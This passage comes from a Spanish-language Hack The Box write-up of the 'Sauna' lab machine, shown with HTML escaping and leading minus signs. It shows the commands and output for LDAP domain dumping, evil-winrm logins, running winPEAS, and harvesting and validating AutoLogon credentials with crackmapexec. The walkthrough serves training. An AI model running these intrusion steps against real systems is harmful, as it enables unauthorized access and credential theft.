-                         &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--no-grep&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;--grouped-json&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-d&lt;/span&gt; DELIMITER] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-r&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-n&lt;/span&gt; DNS_SERVER] &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;nt&quot;&gt;-m&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt;
-                         HOSTNAME
-ldapdomaindump.py: error: the following arguments are required: HOSTNAME
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Una vez que tenemos la utilidad instalada, vamos a tratar de obtener información sobre el dominio.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ python3 ldapdomaindump.py &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'EGOTISTICAL-BANK\FSmith'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Thestrokes23'&lt;/span&gt; 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-o&lt;/span&gt; /var/www/html/
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Connecting to host...
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Binding to host
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Bind OK
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Starting domain dump
-&lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] Domain dump finished
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Corremos el servicio apache y vemos en el navegador nuestro equipo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ service apache2 start
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sauna/sauna-domain.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;De una forma más cómoda podemos ver la información del dominio. Si entramos a los usuarios del dominio, tenemos información interesante.&lt;/p&gt;
-
-&lt;p&gt;&lt;img src=&quot;/assets/images/htb-sauna/sauna-domain1.png&quot; alt=&quot;&quot; /&gt;&lt;/p&gt;
-
-&lt;p&gt;El usuario &lt;strong&gt;FSmith&lt;/strong&gt; pertenece al grupo &lt;strong&gt;Remote Management Users&lt;/strong&gt;, por lo tanto podríamos conectarnos vía &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; (debido a que el puerto 5985 se encuentra abierto) a la máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'FSmith'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Thestrokes23'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.175
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;egotisticalbank&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;smith
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Ya nos encontramos dentro de la máquina y podemos visualizar la flag (user.txt). Ahora vamos a enumerar un poco el sistema para ver de que forma podemos escalar privilegios.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /priv
-
-PRIVILEGES INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
-
-Privilege Name                Description                    State
-&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Enabled
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami&lt;/span&gt; /all
-
-USER INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------&lt;/span&gt;
-
-User Name              SID
-&lt;span class=&quot;o&quot;&gt;======================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================================&lt;/span&gt;
-egotisticalbank&lt;span class=&quot;se&quot;&gt;\f&lt;/span&gt;smith S-1-5-21-2966785786-3096785034-1186376766-1105
-
-
-GROUP INFORMATION
-&lt;span class=&quot;nt&quot;&gt;-----------------&lt;/span&gt;
-
-Group Name                                  Type             SID          Attributes
-&lt;span class=&quot;o&quot;&gt;===========================================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;============&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==================================================&lt;/span&gt;
-Everyone                                    Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
-BUILTIN&lt;span class=&quot;se&quot;&gt;\R&lt;/span&gt;emote Management Users             Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
-BUILTIN&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers                               Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
-BUILTIN&lt;span class=&quot;se&quot;&gt;\P&lt;/span&gt;re-Windows 2000 Compatible Access  Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;ETWORK                        Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\A&lt;/span&gt;uthenticated Users            Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\T&lt;/span&gt;his Organization              Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
-NT AUTHORITY&lt;span class=&quot;se&quot;&gt;\N&lt;/span&gt;TLM Authentication            Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
-Mandatory Label&lt;span class=&quot;se&quot;&gt;\M&lt;/span&gt;edium Plus Mandatory Level Label            S-1-16-8448
-
-
-PRIVILEGES INFORMATION
-&lt;span class=&quot;nt&quot;&gt;----------------------&lt;/span&gt;
-
-Privilege Name                Description                    State
-&lt;span class=&quot;o&quot;&gt;=============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;==============================&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;=======&lt;/span&gt;
-SeMachineAccountPrivilege     Add workstations to domain     Enabled
-SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
-SeIncreaseWorkingSetPrivilege Increase a process working &lt;span class=&quot;nb&quot;&gt;set &lt;/span&gt;Enabled
-
-
-USER CLAIMS INFORMATION
-&lt;span class=&quot;nt&quot;&gt;-----------------------&lt;/span&gt;
-
-User claims unknown.
-
-Kerberos support &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Dynamic Access Control on this device has been disabled.
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;No vemos nada interesante, así que vamos a hacer uso de la herramienta &lt;a href=&quot;https://github.com/carlospolop/PEASS-ng/tree/master/winPEAS&quot;&gt;winPEAS&lt;/a&gt; para encontrar una forma de escalar privielgios, asi que la descargamos y la transferimos al máquina víctima.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; upload /home/k4miyo/Documentos/HTB/Sauna/exploits/winPEASx64.exe C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;inPEASx64.exe
-Info: Uploading /home/k4miyo/Documentos/HTB/Sauna/exploits/winPEASx64.exe to C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&lt;span class=&quot;se&quot;&gt;\w&lt;/span&gt;inPEASx64.exe
-
-                                                             
-Data: 2574336 bytes of 2574336 bytes copied
-
-Info: Upload successful!
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; &lt;span class=&quot;nb&quot;&gt;dir
-
-
-    &lt;/span&gt;Directory: C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads
-
-
-Mode                LastWriteTime         Length Name
-&lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;                &lt;span class=&quot;nt&quot;&gt;-------------&lt;/span&gt;         &lt;span class=&quot;nt&quot;&gt;------&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;----&lt;/span&gt;
-&lt;span class=&quot;nt&quot;&gt;-a----&lt;/span&gt;        1/31/2022   3:53 AM        1930752 winPEASx64.exe
-
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Procedemos a ejecutarlo.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\F&lt;/span&gt;Smith&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ownloads&amp;gt; ./winPEASx64.exe                                                             &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;473/473]
-ANSI color bit &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;Windows is not set. If you are execcuting this from a Windows terminal inside the host you should run &lt;span class=&quot;s1&quot;&gt;'REG ADD
- HKCU\Console /v VirtualTerminalLevel /t REG_DWORD /d 1'&lt;/span&gt; and &lt;span class=&quot;k&quot;&gt;then &lt;/span&gt;start a new CMD                                                
-                                                                                                                                 
-             &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;,.,/&lt;span class=&quot;o&quot;&gt;((((((((((((((((((((&lt;/span&gt;/,  &lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/                                                                                   
-      ,/&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;,..&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;((((((((((((((((((((((((((((((((((&lt;/span&gt;,                                                                                 
-    ,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;/&lt;span class=&quot;o&quot;&gt;((((((((((((((((((&lt;/span&gt;/,  .&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;//&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;//&lt;span class=&quot;k&quot;&gt;**&lt;/span&gt;, .&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;(((((((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;                                                                              
-    &lt;span class=&quot;o&quot;&gt;((((((((((((((((&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;**********&lt;/span&gt;/########## .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; ,&lt;span class=&quot;o&quot;&gt;(((((((&lt;/span&gt;                                                                           
-    &lt;span class=&quot;o&quot;&gt;(((((((((((&lt;/span&gt;/&lt;span class=&quot;k&quot;&gt;********************&lt;/span&gt;/####### .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(((((((&lt;/span&gt;                                                                         
-    &lt;span class=&quot;o&quot;&gt;((((((&lt;/span&gt;..&lt;span class=&quot;k&quot;&gt;******************&lt;/span&gt;/@@@@@/&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;/###### ./&lt;span class=&quot;o&quot;&gt;(((((((&lt;/span&gt;                                                                        
-    ,,....&lt;span class=&quot;k&quot;&gt;********************&lt;/span&gt;@@@@@@@@@@&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;***&lt;/span&gt;,#### .//&lt;span class=&quot;o&quot;&gt;((((((&lt;/span&gt;                                                                      
-    , ,..&lt;span class=&quot;k&quot;&gt;********************&lt;/span&gt;/@@@@@%@@@@/&lt;span class=&quot;k&quot;&gt;********&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;##((/ /((((                                                                     &lt;/span&gt;
-    ..&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;###########*********/%@@@@@@@@@/************,,..((((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;##################(/******/@@@@@/***************.. /((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#########################(/**********************..*((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;##############################(/*****************.,(((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;###################################(/************..(((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#######################################(*********..(((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#######(,.***.,(###################(..***.*******..(((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#######*(#####((##################((######/(*****..(((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;###################(/***********(##############(...(((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#####################/*******(################.((((((                                                                     &lt;/span&gt;
-    .&lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;############################################(..((((                                                                      &lt;/span&gt;
-    ..&lt;span class=&quot;o&quot;&gt;(((&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;##########################################(..(((((                                                                      &lt;/span&gt;
-    ....&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;########################################( .(((((                                                                       &lt;/span&gt;
-    ......&lt;span class=&quot;o&quot;&gt;((&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;####################################( .((((((       &lt;/span&gt;
-    &lt;span class=&quot;o&quot;&gt;(((((((((&lt;/span&gt;&lt;span class=&quot;c&quot;&gt;#################################(../((((((                                                                         &lt;/span&gt;
-        &lt;span class=&quot;o&quot;&gt;(((((((((&lt;/span&gt;/##########################&lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;/..&lt;span class=&quot;o&quot;&gt;((((((&lt;/span&gt;                                                                           
-              &lt;span class=&quot;o&quot;&gt;(((((((((&lt;/span&gt;/,.  ,&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;//////&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;,. ./&lt;span class=&quot;o&quot;&gt;(((((((((((((((&lt;/span&gt;&lt;span class=&quot;nb&quot;&gt;.&lt;/span&gt;                                                                       
-                 &lt;span class=&quot;o&quot;&gt;(((((((((((((((((((((((((((((&lt;/span&gt;/                                                                                  
-                                                                                                                                 
-ADVISORY: winpeas should be used &lt;span class=&quot;k&quot;&gt;for &lt;/span&gt;authorized penetration testing and/or educational purposes only.Any misuse of this software 
-will not be the responsibility of the author or of any other collaborator. Use it at your own networks and/or with the network ow
-ner&lt;span class=&quot;s1&quot;&gt;'s permission.                                                                                                                
-                                                                                                                                 
-  WinPEASng by @carlospolopm, makikvues(makikvues2[at]gmail[dot]com)                                                             
-                                                                                                                                 
-       /---------------------------------------------------------------------------\                                             
-       |                             Do you like PEASS?                            |                                             
-       |---------------------------------------------------------------------------|                                             
-       |         Become a Patreon    :     https://www.patreon.com/peass           |                                             
-       |         Follow on Twitter   :     @carlospolopm                           |                                             
-       |         Respect on HTB      :     SirBroccoli &amp;amp; makikvues                 |                                             
-       |---------------------------------------------------------------------------|                                             
-       |                                 Thank you!                                |                                             
-       \---------------------------------------------------------------------------/
-                                                                
-  [+] Legend:                                                                                                                    
-         Red                Indicates a special privilege over an object or something is misconfigured                           
-         Green              Indicates that some protection is enabled or something is well configured                            
-         Cyan               Indicates active users                                                                               
-         Blue               Indicates disabled users
-         LightYellow        Indicates links
-
-È You can find a Windows local PE Checklist here: https://book.hacktricks.xyz/windows/checklist-windows-privilege-escalation
-   Creating Dynamic lists, this could take a while, please wait...
-   - Loading YAML definitions file...
-   - Checking if domain...
-   - Getting Win32_UserAccount info...
-Error while getting Win32_UserAccount info: System.Management.ManagementException: Access denied
-   at System.Management.ThreadDispatch.Start()
-   at System.Management.ManagementScope.Initialize()
-   at System.Management.ManagementObjectSearcher.Initialize()
-   at System.Management.ManagementObjectSearcher.Get()
-   at winPEAS.Checks.Checks.CreateDynamicLists()
-   - Creating current user groups list...
-   - Creating active users list (local only)...
-  [X] Exception: Object reference not set to an instance of an object.
-   - Creating disabled users list...
-  [X] Exception: Object reference not set to an instance of an object.
-   - Admin users list...
-  [X] Exception: Object reference not set to an instance of an object.
-   - Creating AppLocker bypass list...
-   - Creating files/directories list for search...
-
-
-ÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ¹ System Information ÌÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍÍ
-...
-ÉÍÍÍÍÍÍÍÍÍÍ¹ Home folders found
-    C:\Users\Administrator
-    C:\Users\All Users
-    C:\Users\Default
-    C:\Users\Default User
-    C:\Users\FSmith : FSmith [AllAccess]
-    C:\Users\Public
-    C:\Users\svc_loanmgr
-
-ÉÍÍÍÍÍÍÍÍÍÍ¹ Looking for AutoLogon credentials
-    Some AutoLogon credentials were found
-    DefaultDomainName             :  EGOTISTICALBANK
-    DefaultUserName               :  EGOTISTICALBANK\svc_loanmanager
-    DefaultPassword               :  Moneymakestheworldgoround!
-
-ÉÍÍÍÍÍÍÍÍÍÍ¹ Password Policies
-È Check for a possible brute-force 
-    Domain: Builtin
-    SID: S-1-5-32
-    MaxPasswordAge: 42.22:47:31.7437440
-    MinPasswordAge: 00:00:00
-    MinPasswordLength: 0
-    PasswordHistoryLength: 0
-    PasswordProperties: 0
-&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;En la parte de &lt;strong&gt;Looking for AutoLogon credentials&lt;/strong&gt; tenemos las credenciales del usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc_loanmanager : Moneymakestheworldgoround!&lt;/code&gt;; pero si validamos los usuarios, vemos que es el usuario &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;svc_loanmgr&lt;/code&gt;. Vamos a validar las credenciales.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ crackmapexec smb 10.10.10.175 &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'svc_loanmgr'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Moneymakestheworldgoround!'&lt;/span&gt;
-SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;&lt;span class=&quot;o&quot;&gt;]&lt;/span&gt; Windows 10.0 Build 17763 x64 &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;name:SAUNA&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;domain:EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;signing:True&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt; &lt;span class=&quot;o&quot;&gt;(&lt;/span&gt;SMBv1:False&lt;span class=&quot;o&quot;&gt;)&lt;/span&gt;
-SMB         10.10.10.175    445    SAUNA            &lt;span class=&quot;o&quot;&gt;[&lt;/span&gt;+] EGOTISTICAL-BANK.LOCAL&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr:Moneymakestheworldgoround!
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
-&lt;p&gt;Las credenciales son válidas y el usuario pertenece al grupo &lt;strong&gt;Remote Management Users&lt;/strong&gt;, por lo que podemos conectarnos con &lt;code class=&quot;language-plaintext highlighter-rouge&quot;&gt;evil-winrm&lt;/code&gt; a la máquina.&lt;/p&gt;
-
-&lt;div class=&quot;language-bash highlighter-rouge&quot;&gt;&lt;div class=&quot;highlight&quot;&gt;&lt;pre class=&quot;highlight&quot;&gt;&lt;code&gt;❯ evil-winrm &lt;span class=&quot;nt&quot;&gt;-u&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'svc_loanmgr'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-p&lt;/span&gt; &lt;span class=&quot;s1&quot;&gt;'Moneymakestheworldgoround!'&lt;/span&gt; &lt;span class=&quot;nt&quot;&gt;-i&lt;/span&gt; 10.10.10.175
-
-Evil-WinRM shell v3.3
-
-Warning: Remote path completions is disabled due to ruby limitation: quoting_detection_proc&lt;span class=&quot;o&quot;&gt;()&lt;/span&gt; &lt;span class=&quot;k&quot;&gt;function &lt;/span&gt;is unimplemented on this machine
-
-Data: For more information, check Evil-WinRM Github: https://github.com/Hackplayers/evil-winrm#Remote-path-completion
-
-Info: Establishing connection to remote endpoint
-
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt; &lt;span class=&quot;nb&quot;&gt;whoami
-&lt;/span&gt;egotisticalbank&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr
-&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt;Evil-WinRM&lt;span class=&quot;k&quot;&gt;*&lt;/span&gt; PS C:&lt;span class=&quot;se&quot;&gt;\U&lt;/span&gt;sers&lt;span class=&quot;se&quot;&gt;\s&lt;/span&gt;vc_loanmgr&lt;span class=&quot;se&quot;&gt;\D&lt;/span&gt;ocuments&amp;gt;
-&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/div&gt;
-
